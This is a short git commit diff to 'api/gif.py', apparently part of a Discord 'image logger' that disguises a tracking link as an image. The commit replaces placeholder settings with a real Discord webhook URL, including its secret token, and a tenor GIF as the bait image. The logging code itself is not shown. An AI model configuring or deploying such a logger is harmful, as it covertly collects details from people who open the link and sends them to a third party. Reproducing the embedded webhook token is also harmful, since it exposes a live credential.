e418d777cce0ffc9403166fede0a28f716bc5444
raiidannnnnn <the.logan.fix@gmail.com>
2025-07-20 01:22:18 -0600

    Update gif.py

--- api/gif.py
+++ api/gif.py
@@ -12,8 +12,8 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1396391316694237264/erjQ8l_aVImfa6Fx_qS-pG5iwzzyOjJd-Xj4Ta79McNRjwYmkPPVvIyoMiLiBifOwRyh",
+    "image": "https://media1.tenor.com/m/fBaFaPv5ZcQAAAAC/furry.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
